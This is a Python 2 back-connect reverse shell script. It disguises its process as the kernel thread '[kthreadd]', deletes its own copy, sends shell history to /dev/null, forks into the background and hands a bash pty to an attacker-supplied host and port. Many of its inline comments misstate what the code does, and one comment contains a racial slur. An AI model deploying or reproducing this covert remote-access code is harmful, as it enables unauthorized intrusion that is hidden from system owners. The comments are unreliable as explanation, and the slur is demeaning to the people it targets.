#!/usr/bin/env python2
#import socket, os,  pty, sys, select, shutil
if sys.argv[0] != " ": shutil.copy(sys.argv[0]," ") #if the emptystring isn't emptystring make it an emptystring ? nice try neger.
new_argv = ['[kthreadd]',] #New argument by the name of kthread
for x in xrange(1,100): new_argv.append(" ") #while x is between 1-100
if os.getenv('kk') != 'kk': #If the environement variable kk isn't kk
    os.putenv('kk','kk') #make kk become kk
    os.putenv('bchost',sys.argv[1]) #Make bchost the first argument
    os.putenv('bcport',sys.argv[2])# make bcport the second argument
    try: os.putenv('bcproto',sys.argv[3]) #Try to make bcporto the third argument
    except: os.putenv('bcproto','tcp') # if not set make it tcp
    os.execv(sys.executable, new_argv) #run python with the previously set arguments
esc = '%s['%chr(27) #make esc this string
color = esc + "1;36m" #Color stuff here
reset = esc + "0m" #More color stuff
protocols={"tcp":socket.SOCK_STREAM,"udp":socket.SOCK_DGRAM} #define protocols tcp as sock stream and udp as socl dgram
def shell(host,port,proto): #define the shell as (localhost,port,protocol udp or tcp)
        sock = socket.socket(socket.AF_INET, protocols[proto]) #Reflection for the socket to get a proper one with the protocol we chose
        try: sock.connect( (host, int(port)) ) #Try to connect to the socket we just spawned a python on
        except: pass #if it passed nothing 
        else:
            pid, childProcess = pty.fork() #Create a new thread
            if pid == 0: #if the thread got kernel acess
                os.putenv("HISTFILE","/dev/null") #make histfile point to dev null = make it delete
                os.putenv("HOME",os.getcwd()) #Home = current directory
                os.putenv("PATH",'/usr/local/sbin:/usr/sbin:/sbin:'+os.getenv('PATH')) #make path be $PATH (aka sbin dir of user)
                os.putenv("TERM",'screen') #Terminal = screen command
                os.execv("/bin/bash",("[kthreadd]",)) #kthread into bin bash
                sock.shutdown(1) #Kill the socket
            else:
                b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK) #Make a new read only file
                c = os.fdopen(childProcess,'r+') #Open the child process
                y = {b:c,c:b} #Print the process into the file
                try:
                    while True:
                        for n in select.select([b,c],[],[])[0]:
                            z = os.read(n.fileno(),4096)#read the file
                            y[n].write(z)
                            y[n].flush()
                except: exit()
bchost = os.getenv('bchost')#sets bchost to default bchost
bcport = os.getenv('bcport')#same
bcproto = os.getenv('bcproto')#same
os.unsetenv('bchost')#unset bchost
os.unsetenv('bcport')#same ^
os.unsetenv('bcproto')#same ^
os.unsetenv('kk')#same ^
os.unlink(" ")#same ^
pid=0 #make pid be 0
pid=os.fork() #make pid read the fork pid
if not pid: shell(bchost,bcport,bcproto) #try again
else: exit()#this is the end my friend
